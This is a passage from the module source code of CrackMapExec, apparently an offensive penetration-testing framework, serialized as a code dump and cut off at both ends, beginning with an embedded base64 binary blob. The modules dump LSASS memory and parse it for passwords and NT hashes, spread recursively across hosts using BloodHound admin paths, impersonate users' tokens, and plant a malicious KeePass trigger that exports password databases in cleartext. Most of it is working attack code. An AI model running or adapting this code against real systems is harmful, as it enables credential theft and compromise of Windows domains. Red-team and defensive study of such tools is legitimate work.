AEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQAoIAEAKCABACggAQBtc3ZjcnQuZGxskBlAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4BlAAAAAAACwn        )\n        self.handlekatz = ""handlekatz.exe""\n        self.handlekatz_path = ""/tmp/""\n        self.dir_result = self.handlekatz_path\n        self.useembeded = True\n\n        if ""HANDLEKATZ_PATH"" in module_options:\n            self.handlekatz_path = module_options[""HANDLEKATZ_PATH""]\n            self.useembeded = False\n\n        if ""HANDLEKATZ_EXE_NAME"" in module_options:\n            self.handlekatz = module_options[""HANDLEKATZ_EXE_NAME""]\n\n        if ""TMP_DIR"" in module_options:\n            self.tmp_dir = module_options[""TMP_DIR""]\n\n        if ""DIR_RESULT"" in module_options:\n            self.dir_result = module_options[""DIR_RESULT""]\n\n    def on_admin_login(self, context, connection):\n        if self.useembeded:\n            with open(self.handlekatz_path + self.handlekatz, ""wb"") as handlekatz:\n                handlekatz.write(self.handlekatz_embeded)\n\n        context.log.display(f""Copy {self.handlekatz_path + self.handlekatz} to {self.tmp_dir}"")\n        with open(self.handlekatz_path + self.handlekatz, ""rb"") as handlekatz:\n            try:\n                connection.conn.putFile(self.share, self.tmp_share + self.handlekatz, handlekatz.read)\n                context.log.success(f""[OPSEC] Created file {self.handlekatz} on the \\\\\\\\{self.share}{self.tmp_share}"")\n            except Exception as e:\n                context.log.fail(f""Error writing file to share {self.share}: {e}"")\n\n        # get LSASS PID via `tasklist`\n        command = \'tasklist /v /fo csv | findstr /i ""lsass""\'\n        context.log.display(f""Getting lsass PID via command {command}"")\n        p = connection.execute(command, True)\n        context.log.debug(f""Command Result: {p}"")\n        if len(p) == 1:\n            p = p[0]\n\n        if not p or p == ""None"":\n            context.log.fail(f""Failed to execute command to get LSASS PID"")\n            return\n        # we get a CSV string back from `tasklist`, so we grab the PID from it\n        pid = p.split("","")[1][1:-1]\n        context.log.debug(f""pid: {pid}"")\n\n        command = self.tmp_dir + self.handlekatz + "" --pid:"" + pid + "" --outfile:"" + self.tmp_dir + ""%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.log""\n        context.log.display(f""Executing command {command}"")\n\n        p = connection.execute(command, True)\n        context.log.debug(f""Command result: {p}"")\n\n        if ""Lsass dump is complete"" in p:\n            context.log.success(""Process lsass.exe was successfully dumped"")\n            dump = True\n        else:\n            context.log.fail(""Process lsass.exe error un dump, try with verbose"")\n            dump = False\n\n        if dump:\n            regex = r""([A-Za-z0-9-]*\\.log)""\n            matches = re.search(regex, str(p), re.MULTILINE)\n            if not matches:\n                context.log.display(""Error getting the lsass.dmp file name"")\n                sys.exit(1)\n\n            machine_name = matches.group()\n            context.log.display(f""Copy {machine_name} to host"")\n\n            with open(self.dir_result + machine_name, ""wb+"") as dump_file:\n                try:\n                    connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)\n                    context.log.success(f""Dumpfile of lsass.exe was transferred to {self.dir_result + machine_name}"")\n                except Exception as e:\n                    context.log.fail(f""Error while get file: {e}"")\n\n            try:\n                connection.conn.deleteFile(self.share, self.tmp_share + self.handlekatz)\n                context.log.success(f""Deleted handlekatz file on the {self.share} share"")\n            except Exception as e:\n                context.log.fail(f""[OPSEC] Error deleting handlekatz file on share {self.share}: {e}"")\n\n            try:\n                connection.conn.deleteFile(self.share, self.tmp_share + machine_name)\n                context.log.success(f""Deleted lsass.dmp file on the {self.share} share"")\n            except Exception as e:\n                context.log.fail(f""[OPSEC] Error deleting lsass.dmp file on share {self.share}: {e}"")\n\n            h_in = open(self.dir_result + machine_name, ""rb"")\n            h_out = open(self.dir_result + machine_name + "".decode"", ""wb"")\n\n            bytes_in = bytearray(h_in.read())\n            bytes_in_len = len(bytes_in)\n\n            context.log.display(f""Deobfuscating, this might take a while (size: {bytes_in_len} bytes)"")\n\n            chunks = [bytes_in[i : i + 1000000] for i in range(0, bytes_in_len, 1000000)]\n            for chunk in chunks:\n                for i in range(0, len(chunk)):\n                    chunk[i] ^= 0x41\n\n                h_out.write(bytes(chunk))\n\n            with open(self.dir_result + machine_name + "".decode"", ""rb"") as dump:\n                try:\n                    credz_bh = []\n                    try:\n                        pypy_parse = pypykatz.parse_minidump_external(dump)\n                    except Exception as e:\n                        pypy_parse = None\n                        context.log.fail(f""Error parsing minidump: {e}"")\n\n                    ssps = [\n                        ""msv_creds"",\n                        ""wdigest_creds"",\n                        ""ssp_creds"",\n                        ""livessp_creds"",\n                        ""kerberos_creds"",\n                        ""credman_creds"",\n                        ""tspkg_creds"",\n                    ]\n                    for luid in pypy_parse.logon_sessions:\n                        for ssp in ssps:\n                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):\n                                domain = getattr(cred, ""domainname"", None)\n                                username = getattr(cred, ""username"", None)\n                                password = getattr(cred, ""password"", None)\n                                NThash = getattr(cred, ""NThash"", None)\n                                if NThash is not None:\n                                    NThash = NThash.hex()\n                                if username and (password or NThash) and ""$"" not in username:\n                                    print_pass = password if password else NThash\n                                    context.log.highlight(domain + ""\\\\"" + username + "":"" + print_pass)\n                                    if ""."" not in domain and domain.upper() in connection.domain.upper():\n                                        domain = connection.domain\n                                        credz_bh.append(\n                                            {\n                                                ""username"": username.upper(),\n                                                ""domain"": domain.upper(),\n                                            }\n                                        )\n                    if len(credz_bh) > 0:\n                        add_user_bh(credz_bh, None, context.log, connection.config)\n                except Exception as e:\n                    context.log.fail(""Error opening dump file"", str(e))\n', 'hash_spider.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Author: Peter Gormington (@hackerm00n on Twitter)\nimport logging\nfrom sqlite3 import connect\nfrom sys import exit\nfrom neo4j import GraphDatabase, basic_auth\nfrom neo4j.exceptions import AuthError, ServiceUnavailable\nfrom lsassy.dumper import Dumper\nfrom lsassy.parser import Parser\nfrom lsassy.session import Session\nfrom lsassy.impacketfile import ImpacketFile\n\ncredentials_data = []\nadmin_results = []\nfound_users = []\nreported_da = []\n\n\ndef neo4j_conn(context, connection, driver):\n    if connection.config.get(""BloodHound"", ""bh_enabled"") != ""False"":\n        context.log.display(""Connecting to Neo4j/Bloodhound."")\n        try:\n            session = driver.session()\n            list(session.run(""MATCH (g:Group) return g LIMIT 1""))\n            context.log.display(""Connection Successful!"")\n        except AuthError as e:\n            context.log.fail(""Invalid credentials"")\n        except ServiceUnavailable as e:\n            context.log.fail(""Could not connect to neo4j database"")\n        except Exception as e:\n            context.log.fail(""Error querying domain admins"")\n            context.log.debug(e)\n    else:\n        context.log.fail(""BloodHound not marked enabled. Check cme.conf"")\n        exit(1)\n\n\ndef neo4j_local_admins(context, driver):\n    global admin_results\n    try:\n        session = driver.session()\n        admins = session.run(""MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC"")  # This query pulls all PCs and their local admins from Bloodhound. Based on: https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md and other similar posts\n        context.log.success(""Admins and PCs obtained."")\n    except Exception:\n        context.log.fail(""Could not pull admins"")\n        exit()\n    admin_results = [record for record in admins.data()]\n\n\ndef create_db(local_admins, dbconnection, cursor):\n    cursor.execute(""""""CREATE TABLE if not exists pc_and_admins (""pc_name"" TEXT UNIQUE, ""local_admins"" TEXT, ""dumped"" TEXT)"""""")\n    for result in local_admins:\n        cursor.execute(\n            ""INSERT OR IGNORE INTO pc_and_admins(pc_name, local_admins, dumped) VALUES(?, ?, ?)"",\n            (\n                result.get(""COMPUTER""),\n                str(\n                    result.get(""USERS""),\n                ),\n                ""FALSE"",\n            ),\n        )\n    dbconnection.commit()\n    cursor.execute(""""""CREATE TABLE if not exists admin_users(""username"" TEXT UNIQUE, ""hash"" TEXT, ""password"" TEXT)"""""")\n    admin_users = []\n    for result in local_admins:\n        for user in result.get(""USERS""):\n            if user not in admin_users:\n                admin_users.append(user)\n    for user in admin_users:\n        cursor.execute(""""""INSERT OR IGNORE INTO admin_users(username) VALUES(?)"""""", [user])\n    dbconnection.commit()\n\n\ndef process_creds(context, connection, credentials_data, dbconnection, cursor, driver):\n    if connection.args.local_auth:\n        context.log.extra[""host""] = connection.conn.getServerDNSDomainName()\n    else:\n        context.log.extra[""host""] = connection.domain\n    context.log.extra[""hostname""] = connection.host.upper()\n    for result in credentials_data:\n        username = result[""username""].upper().split(""@"")[0]\n        nthash = result[""nthash""]\n        password = result[""password""]\n        if result[""password""] is not None:\n            context.log.highlight(f""Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH."")\n            cursor.execute(\n                ""UPDATE admin_users SET password = ? WHERE username LIKE \'"" + username + ""%\'"",\n                [password],\n            )\n            username = f""{username.upper()}@{context.log.extra[\'host\'].upper()}""\n            dbconnection.commit()\n            session = driver.session()\n            session.run(\'MATCH (u) WHERE (u.name = ""\' + username + \'"") SET u.owned=True RETURN u,u.name,u.owned\')\n        if nthash == ""aad3b435b51404eeaad3b435b51404ee"" or nthash == ""31d6cfe0d16ae931b73c59d7e0c089c0"":\n            context.log.fail(f""Hash for {username} is expired."")\n        elif username not in found_users and nthash is not None:\n            context.log.highlight(f""Found hashes for: \'{username}:{nthash}\'. Adding them to the DB and marking user as owned in BH."")\n            found_users.append(username)\n            cursor.execute(\n                ""UPDATE admin_users SET hash = ? WHERE username LIKE \'"" + username + ""%\'"",\n                [nthash],\n            )\n            dbconnection.commit()\n            username = f""{username.upper()}@{context.log.extra[\'host\'].upper()}""\n            session = driver.session()\n            session.run(\'MATCH (u) WHERE (u.name = ""\' + username + \'"") SET u.owned=True RETURN u,u.name,u.owned\')\n            path_to_da = session.run(""MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ \'.*DOMAIN ADMINS.*\' RETURN p"")\n            paths = [record for record in path_to_da.data()]\n\n            for path in paths:\n                if path:\n                    for key, value in path.items():\n                        for item in value:\n                            if type(item) == dict:\n                                if {item[""name""]} not in reported_da:\n                                    context.log.success(f""You have a valid path to DA as {item[\'name\']}."")\n                                    reported_da.append({item[""name""]})\n                                exit()\n\n\ndef initial_run(connection, cursor):\n    username = connection.username\n    password = getattr(connection, ""password"", """")\n    nthash = getattr(connection, ""nthash"", """")\n    cursor.execute(\n        ""UPDATE admin_users SET password = ? WHERE username LIKE \'"" + username + ""%\'"",\n        [password],\n    )\n    cursor.execute(\n        ""UPDATE admin_users SET hash = ? WHERE username LIKE \'"" + username + ""%\'"",\n        [nthash],\n    )\n\n\nclass CMEModule:\n    name = ""hash_spider""\n    description = ""Dump lsass recursively from a given hash using BH to find local admins""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.reset = None\n        self.reset_dumped = None\n        self.method = None\n    @staticmethod\n    def save_credentials(context, connection, domain, username, password, lmhash, nthash):\n        host_id = context.db.get_computers(connection.host)[0][0]\n        if password is not None:\n            credential_type = \'plaintext\'\n        else:\n            credential_type = \'hash\'\n            password = \':\'.join(h for h in [lmhash, nthash] if h is not None)\n        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)\n    def options(self, context, module_options):\n        """"""\n        METHOD              Method to use to dump lsass.exe with lsassy\n        RESET_DUMPED        Allows re-dumping of hosts. (Default: False)\n        RESET               Reset DB. (Default: False)\n        """"""\n        self.method = ""comsvcs""\n        if ""METHOD"" in module_options:\n            self.method = module_options[""METHOD""]\n        self.reset_dumped = module_options.get(""RESET_DUMPED"", False)\n        self.reset = module_options.get(""RESET"", False)\n\n    def run_lsassy(self, context, connection, cursor):  # copied and pasted from lsassy_dumper & added cursor\n        # lsassy uses a custom ""success"" level, which requires initializing its logger or an error will be thrown\n        # lsassy also removes all other handlers and overwrites the formatter which is bad (we want ours)\n        # so what we do is define ""success"" as a logging level, then do nothing with the output\n        logging.addLevelName(25, ""SUCCESS"")\n        setattr(logging, ""success"", lambda message, *args: ())\n\n        host = connection.host\n        domain_name = connection.domain\n        username = connection.username\n        password = getattr(connection, ""password"", """")\n        lmhash = getattr(connection, ""lmhash"", """")\n        nthash = getattr(connection, ""nthash"", """")\n        session = Session()\n        session.get_session(\n            address=host,\n            target_ip=host,\n            port=445,\n            lmhash=lmhash,\n            nthash=nthash,\n            username=username,\n            password=password,\n            domain=domain_name,\n        )\n        if session.smb_session is None:\n            context.log.fail(""Couldn\'t connect to remote host. Password likely expired/changed. Removing from DB."")\n            cursor.execute(f""UPDATE admin_users SET hash = NULL WHERE username LIKE \'{username}\'"")\n            return False\n        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)\n        if dumper is None:\n            context.log.fail(""Unable to load dump method \'{}\'"".format(self.method))\n            return False\n        file = dumper.dump()\n        if file is None:\n            context.log.fail(""Unable to dump lsass"")\n            return False\n        credentials, tickets, masterkeys = Parser(file).parse()\n        file.close()\n        ImpacketFile.delete(session, file.get_file_path())\n        if credentials is None:\n            credentials = []\n        credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith(""$"")]\n        credentials_unique = []\n        credentials_output = []\n        for cred in credentials:\n            if [\n                cred[""domain""],\n                cred[""username""],\n                cred[""password""],\n                cred[""lmhash""],\n                cred[""nthash""],\n            ] not in credentials_unique:\n                credentials_unique.append(\n                    [\n                        cred[""domain""],\n                        cred[""username""],\n                        cred[""password""],\n                        cred[""lmhash""],\n                        cred[""nthash""],\n                    ]\n                )\n                credentials_output.append(cred)\n                self.save_credentials(context, connection, cred[""domain""], cred[""username""], cred[""password""], cred[""lmhash""], cred[""nthash""])\n        global credentials_data\n        credentials_data = credentials_output\n\n    def spider_pcs(self, context, connection, cursor, dbconnection, driver):\n        cursor.execute(""SELECT * from admin_users WHERE hash is not NULL"")\n        compromised_users = cursor.fetchall()\n        cursor.execute(""SELECT pc_name,local_admins FROM pc_and_admins WHERE dumped LIKE \'FALSE\'"")\n        admin_access = cursor.fetchall()\n        for user in compromised_users:\n            for pc in admin_access:\n                if user[0] in pc[1]:\n                    cursor.execute(f""SELECT * FROM pc_and_admins WHERE pc_name = \'{pc[0]}\' AND dumped NOT LIKE \'TRUE\'"")\n                    more_to_dump = cursor.fetchall()\n                    if len(more_to_dump) > 0:\n                        context.log.display(f""User {user[0]} has more access to {pc[0]}. Attempting to dump."")\n                        connection.domain = user[0].split(""@"")[1]\n                        setattr(connection, ""host"", pc[0].split(""."")[0])\n                        setattr(connection, ""username"", user[0].split(""@"")[0])\n                        setattr(connection, ""nthash"", user[1])\n                        setattr(connection, ""nthash"", user[1])\n                        try:\n                            self.run_lsassy(context, connection, cursor)\n                            cursor.execute(""UPDATE pc_and_admins SET dumped = \'TRUE\' WHERE pc_name LIKE \'"" + pc[0] + ""%\'"")\n\n                            process_creds(\n                                context,\n                                connection,\n                                credentials_data,\n                                dbconnection,\n                                cursor,\n                                driver,\n                            )\n                            self.spider_pcs(context, connection, cursor, dbconnection, driver)\n                        except Exception:\n                            context.log.fail(f""Failed to dump lsassy on {pc[0]}"")\n        if len(admin_access) > 0:\n            context.log.fail(""No more local admin access known. Please try re-running Bloodhound with newly found accounts."")\n            exit()\n\n    def on_admin_login(self, context, connection):\n        db_path = connection.config.get(""CME"", ""workspace"")\n        # DB will be saved at ./CrackMapExec/hash_spider_default.sqlite3 if workspace in cme.conf is ""default""\n        db_name = f""hash_spider_{db_path}.sqlite3""\n        dbconnection = connect(db_name, check_same_thread=False, isolation_level=None)\n\n        cursor = dbconnection.cursor()\n        if self.reset:\n            try:\n                cursor.execute(""DROP TABLE IF EXISTS admin_users;"")\n                cursor.execute(""DROP TABLE IF EXISTS pc_and_admins;"")\n                context.log.display(""Database reset"")\n                exit()\n            except Exception as e:\n                context.log.fail(""Database reset error"", str(e))\n                exit()\n\n        if self.reset_dumped:\n            try:\n                cursor.execute(""UPDATE pc_and_admins SET dumped = \'False\'"")\n                context.log.display(""PCs can be dumped again."")\n            except Exception as e:\n                context.log.fail(""Database update error"", str(e))\n                exit()\n\n        neo4j_user = connection.config.get(""BloodHound"", ""bh_user"")\n        neo4j_pass = connection.config.get(""BloodHound"", ""bh_pass"")\n        neo4j_uri = connection.config.get(""BloodHound"", ""bh_uri"")\n        neo4j_port = connection.config.get(""BloodHound"", ""bh_port"")\n        neo4j_db = f""bolt://{neo4j_uri}:{neo4j_port}""\n        driver = GraphDatabase.driver(neo4j_db, auth=basic_auth(neo4j_user, neo4j_pass), encrypted=False)\n        neo4j_conn(context, connection, driver)\n        neo4j_local_admins(context, driver)\n        create_db(admin_results, dbconnection, cursor)\n        initial_run(connection, cursor)\n        context.log.display(""Running lsassy"")\n        self.run_lsassy(context, connection, cursor)\n        process_creds(context, connection, credentials_data, dbconnection, cursor, driver)\n        context.log.display(""🕷️ Starting to spider 🕷️"")\n        self.spider_pcs(context, connection, cursor, dbconnection, driver)\n', 'impersonate.py': '# Impersonate module for CME \n# Author of the module : https://twitter.com/Defte_\n# Impersonate: https://github.com/sensepost/Impersonate\n# Token manipulation blog post https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/\n\nfrom base64 import b64decode\nfrom sys import exit\nfrom os import path\n\nclass CMEModule:\n\n    name = ""impersonate""\n    description = ""List and impersonate tokens to run command as locally logged on users""\n    supported_protocols = [""smb""]\n    opsec_safe = True # could be flagged\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        \'\'\'\n            TOKEN     // Token id to usurp\n            EXEC      // Command to exec\n            IMP_EXE   // Path to the Impersonate binary on your local computer\n        \'\'\'\n\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.share = ""C$""\n        self.tmp_share = self.tmp_dir.split("":"")[1]\n        self.impersonate = ""Impersonate.exe""\n        self.useembeded = True\n        self.token = self.cmd = """"\n        self.impersonate_embedded = b64decode(""n        if ""EXEC"" in module_options:\n            self.cmd = module_options[""EXEC""]\n\n        if ""TOKEN"" in module_options:\n            self.token = module_options[""TOKEN""]\n\n        if ""IMP_EXE"" in module_options:\n            self.imp_exe = module_options[""IMP_EXE""]\n            self.useembeded = False\n\n    def list_available_primary_tokens(self, _, connection):\n        command = f""{self.tmp_dir}Impersonate.exe list""\n        return connection.execute(command, True)\n        \n    def on_admin_login(self, context, connection):\n\n        if self.useembeded:\n            file_to_upload = ""/tmp/Impersonate.exe""\n            with open(file_to_upload, \'wb\') as impersonate:\n                impersonate.write(self.impersonate_embedded)\n        else:\n            if path.isfile(self.imp_exe):\n                file_to_upload = self.imp_exe\n            else:\n                context.log.error(f""Cannot open {self.imp_exe}"")\n                exit(1)\n\n        context.log.display(f""Uploading {self.impersonate}"")\n        with open(file_to_upload, \'rb\') as impersonate:\n            try:\n                connection.conn.putFile(self.share, f""{self.tmp_share}{self.impersonate}"", impersonate.read)\n                context.log.success(f""Impersonate binary successfully uploaded"")\n            except Exception as e:\n                context.log.fail(f""Error writing file to share {self.tmp_share}: {e}"")\n                return\n\n        try:\n            if self.cmd == """" or self.token == """":\n                context.log.display(f""Listing available primary tokens"")\n                p = self.list_available_primary_tokens(context, connection)\n                for line in p.splitlines():\n                    token, token_integrity, token_owner = line.split("" "", 2)\n                    context.log.highlight(f""Primary token ID: {token:<2} {token_integrity:<6} {token_owner}"")\n            else:\n                impersonated_user = """"\n                p = self.list_available_primary_tokens(context, connection)\n                for line in p.splitlines():\n                    token_id, token_integrity, token_owner = line.split("" "", 2)\n                    if token_id == self.token:\n                        impersonated_user = token_owner.strip()\n                        break\n\n                if impersonated_user:  \n                    context.log.display(f""Executing {self.cmd} as {impersonated_user}"")\n                    command = f\'{self.tmp_dir}Impersonate.exe exec {self.token} \\""{self.cmd}\\""\'\n                    for line in connection.execute(command, True, methods=[""smbexec""]).splitlines():\n                        context.log.highlight(line)\n                else:\n                    context.log.fail(f""Invalid token ID submitted"")\n\n        except Exception as e:\n            context.log.fail(f""Error runing command: {e}"")\n        finally:\n            try:\n                connection.conn.deleteFile(self.share, f""{self.tmp_share}{self.impersonate}"")\n                context.log.success(f""Impersonate binary successfully deleted"")\n            except Exception as e:\n                context.log.fail(f""Error deleting Impersonate.exe on {self.share}: {e}"")\n', 'install_elevated.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.dcerpc.v5 import scmr\nfrom impacket.examples.secretsdump import RemoteOperations\n\n\nclass CMEModule:\n    name = ""install_elevated""\n    description = ""Checks for AlwaysInstallElevated""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_admin_login(self, context, connection):\n        try:\n            remote_ops = RemoteOperations(connection.conn, False)\n            remote_ops.enableRegistry()\n\n            try:\n                ans_machine = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)\n                reg_handle = ans_machine[""phKey""]\n                ans_machine = rrp.hBaseRegOpenKey(\n                    remote_ops._RemoteOperations__rrp,\n                    reg_handle,\n                    ""SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer"",\n                )\n                key_handle = ans_machine[""phkResult""]\n                data_type, aie_machine_value = rrp.hBaseRegQueryValue(\n                    remote_ops._RemoteOperations__rrp,\n                    key_handle,\n                    ""AlwaysInstallElevated"",\n                )\n                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)\n\n                if aie_machine_value == 0:\n                    context.log.highlight(""AlwaysInstallElevated Status: 0 (Disabled)"")\n                    return\n            except rrp.DCERPCSessionError:\n                context.log.highlight(""AlwaysInstallElevated Status: 0 (Disabled)"")\n                return\n            try:\n                ans_user = rrp.hOpenCurrentUser(remote_ops._RemoteOperations__rrp)\n                reg_handle = ans_user[""phKey""]\n                ans_user = rrp.hBaseRegOpenKey(\n                    remote_ops._RemoteOperations__rrp,\n                    reg_handle,\n                    ""SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer"",\n                )\n                key_handle = ans_user[""phkResult""]\n                data_type, aie_user_value = rrp.hBaseRegQueryValue(\n                    remote_ops._RemoteOperations__rrp,\n                    key_handle,\n                    ""AlwaysInstallElevated"",\n                )\n                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)\n            except rrp.DCERPCSessionError:\n                context.log.highlight(""AlwaysInstallElevated Status: 1 (Enabled: Computer Only)"")\n                return\n            if aie_user_value == 0:\n                context.log.highlight(""AlwaysInstallElevated Status: 1 (Enabled: Computer Only)"")\n            else:\n                context.log.highlight(""AlwaysInstallElevated Status: 1 (Enabled)"")\n        finally:\n            try:\n                remote_ops.finish()\n            except scmr.DCERPCSessionError as e:\n                context.log.debug(f""Received SessionError while attempting to clean up logins: {e}"")\n            except Exception as e:\n                context.log.debug(f""Received general exception while attempting to clean up logins: {e}"")\n', 'keepass_discover.py': 'from csv import reader\n\n\nclass CMEModule:\n    """"""\n    Search for KeePass-related files and process\n\n    Module by @d3lb3\n    Inspired by @harmj0y https://raw.githubusercontent.com/GhostPack/KeeThief/master/PowerShell/KeePassConfig.ps1\n    """"""\n\n    name = ""keepass_discover""\n    description = ""Search for KeePass-related files and process.""\n    supported_protocols = [""smb""]\n    opsec_safe = True  # only legitimate commands are executed on the remote host (search process and files)\n    multiple_hosts = True\n\n    def __init__(self):\n        self.search_type = ""ALL""\n        self.search_path = ""\'C:\\\\Users\\\\\',\'$env:PROGRAMFILES\',\'env:ProgramFiles(x86)\'""\n\n    def options(self, context, module_options):\n        """"""\n        SEARCH_TYPE     Specify what to search, between:\n                          PROCESS     Look for running KeePass.exe process only\n                          FILES       Look for KeePass-related files (KeePass.config.xml, .kdbx, KeePass.exe) only, may take some time\n                          ALL         Look for running KeePass.exe process and KeePass-related files (default)\n\n        SEARCH_PATH     Comma-separated remote locations where to search for KeePass-related files (you must add single quotes around the paths if they include spaces)\n                        Default: \'C:\\\\Users\\\\\',\'$env:PROGRAMFILES\',\'env:ProgramFiles(x86)\'\n        """"""\n\n        if ""SEARCH_PATH"" in module_options:\n            self.search_path = module_options[""SEARCH_PATH""]\n\n        if ""SEARCH_TYPE"" in module_options:\n            self.search_type = module_options[""SEARCH_TYPE""]\n\n    def on_admin_login(self, context, connection):\n        if self.search_type == ""ALL"" or self.search_type == ""PROCESS"":\n            # search for keepass process\n            search_keepass_process_command_str = \'powershell.exe ""Get-Process kee* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation""\'\n            search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)  # we return the powershell command as a CSV for easier column parsing\n            csv_reader = reader(search_keepass_process_output_csv.split(""\\n""), delimiter="","")\n            next(csv_reader)  # to skip the csv header line\n            row_number = 0  # as csv_reader is an iterator we can\'t get its length without exhausting it\n            for row in csv_reader:\n                row_number += 1\n                keepass_process_id = row[0]\n                keepass_process_username = row[1]\n                keepass_process_name = row[2]\n                context.log.highlight(\n                    \'Found process ""{}"" with PID {} (user {})\'.format(\n                        keepass_process_name,\n                        keepass_process_id,\n                        keepass_process_username,\n                    )\n                )\n            if row_number == 0:\n                context.log.display(""No KeePass-related process was found"")\n\n        # search for keepass-related files\n        if self.search_type == ""ALL"" or self.search_type == ""FILES"":\n            search_keepass_files_payload = ""Get-ChildItem -Path {} -Recurse -Force -Include (\'KeePass.config.xml\',\'KeePass.exe\',\'*.kdbx\') -ErrorAction SilentlyContinue | Select FullName -ExpandProperty FullName"".format(self.search_path)\n            search_keepass_files_cmd = \'powershell.exe ""{}""\'.format(search_keepass_files_payload)\n            search_keepass_files_output = connection.execute(search_keepass_files_cmd, True).split(""\\r\\n"")\n            found = False\n            found_xml = False\n            for file in search_keepass_files_output:\n                if ""KeePass"" in file or ""kdbx"" in file:\n                    if ""xml"" in file:\n                        found_xml = True\n                    found = True\n                    context.log.highlight(""Found {}"".format(file))\n            if not found:\n                context.log.display(""No KeePass-related file were found"")\n            elif not found_xml:\n                context.log.fail(""No config settings file found !!!"")\n', 'keepass_trigger.py': 'import os\nimport sys\nimport json\nfrom xmltodict import parse\nfrom time import sleep\nfrom csv import reader\nfrom base64 import b64encode\nfrom io import BytesIO, StringIO\nfrom xml.etree import ElementTree\nfrom cme.helpers.powershell import get_ps_script\n\n\nclass CMEModule:\n    """"""\n    Make use of KeePass\' trigger system to export the database in cleartext\n    References: https://keepass.info/help/v2/triggers.html\n                https://web.archive.org/web/20211017083926/http://www.harmj0y.net:80/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/\n\n    Module by @d3lb3, inspired by @harmj0y work\n    """"""\n\n    name = ""keepass_trigger""\n    description = ""Set up a malicious KeePass trigger to export the database in cleartext.""\n    supported_protocols = [""smb""]\n    # while the module only executes legit powershell commands on the target (search and edit files)\n    # some EDR like Trend Micro flag base64-encoded powershell as malicious\n    # the option PSH_EXEC_METHOD can be used to avoid such execution, and will drop scripts on the target\n    opsec_safe = False\n    multiple_hosts = False\n\n    def __init__(self):\n        # module options\n        self.action = None\n        self.keepass_config_path = None\n        self.keepass_user = None\n        self.export_name = ""export.xml""\n        self.export_path = ""C:\\\\Users\\\\Public""\n        self.powershell_exec_method = ""PS1""\n\n        # additional parameters\n        self.share = ""C$""\n        self.remote_temp_script_path = ""C:\\\\Windows\\\\Temp\\\\temp.ps1""\n        self.keepass_binary_path = ""C:\\\\Program Files\\\\KeePass Password Safe 2\\\\KeePass.exe""\n        self.local_export_path = ""/tmp""\n        self.trigger_name = ""export_database""\n        self.poll_frequency_seconds = 5\n        self.dummy_service_name = ""OneDrive Sync KeePass""\n\n        with open(get_ps_script(""keepass_trigger_module/RemoveKeePassTrigger.ps1""), ""r"") as remove_trigger_script_file:\n            self.remove_trigger_script_str = remove_trigger_script_file.read()\n\n        with open(get_ps_script(""keepass_trigger_module/AddKeePassTrigger.ps1""), ""r"") as add_trigger_script_file:\n            self.add_trigger_script_str = add_trigger_script_file.read()\n\n        with open(get_ps_script(""keepass_trigger_module/RestartKeePass.ps1""), ""r"") as restart_keepass_script_file:\n            self.restart_keepass_script_str = restart_keepass_script_file.read()\n\n    def options(self, context, module_options):\n        """"""\n        ACTION (mandatory)      Performs one of the following actions, specified by the user:\n                                  ADD           insert a new malicious trigger into KEEPASS_CONFIG_PATH\'s specified file\n                                  CHECK         check if a malicious trigger is currently set in KEEPASS_CONFIG_PATH\'s\n                                                specified file\n                                  RESTART       restart KeePass using a Windows service (used to force trigger reload),\n                                                if multiple KeePass process are running, rely on USER option\n                                  POLL          search for EXPORT_NAME file in EXPORT_PATH folder\n                                                (until found, or manually exited by the user)\n                                  CLEAN         remove malicious trigger from KEEPASS_CONFIG_PATH as well as database\n                                                export files from EXPORT_PATH\n                                  ALL           performs ADD, CHECK, RESTART, POLL, CLEAN actions one after the other\n\n        KEEPASS_CONFIG_PATH     Path of the remote KeePass configuration file where to add a malicious trigger\n                                (used by ADD, CHECK and CLEAN actions)\n        USER                    Targeted user running KeePass, used to restart the appropriate process\n                                (used by RESTART action)\n\n        EXPORT_NAME             Name fo the database export file, default: export.xml\n        EXPORT_PATH             Path where to export the KeePass database in cleartext\n                                default: C:\\\\Users\\\\Public, %APPDATA% works well too for user permissions\n\n        PSH_EXEC_METHOD         Powershell execution method, may avoid detections depending on the AV/EDR in use\n                                (while no \'malicious\' command 